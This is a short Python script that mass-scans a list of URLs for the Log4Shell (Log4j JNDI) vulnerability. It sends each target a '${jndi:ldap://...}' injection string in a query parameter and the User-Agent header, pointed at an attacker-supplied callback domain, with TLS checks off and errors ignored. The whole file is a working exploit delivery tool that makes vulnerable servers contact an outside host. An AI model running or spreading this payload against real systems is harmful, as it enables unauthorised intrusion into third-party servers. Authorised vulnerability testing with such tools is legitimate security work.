from sys import argv
import requests
from time import sleep
import urllib3

urllib3.disable_warnings()

if len(argv) > 1:
    urlFile = open(argv[1], 'r')
    urls = urlFile.readlines()
    count = 0
    for url in urls:
        try:
            count += 1
            params = {'test': '${jndi:ldap://' + str(count) + '.' + argv[2] + '/a}'}
            headers = {'User-Agent': '${jndi:ldap://' + str(count) + '.' + argv[2] + '/a}'}
            url = url.strip()
            print('[{}] Testing {}'.format(count, url))
            requests.get(url, headers=headers, params=params, verify=False, timeout=10)
        except:
            pass
        sleep(0.3)
else:
    print('[!] Syntax: python3 {} <urlList> <collab>'.format(argv[0]))
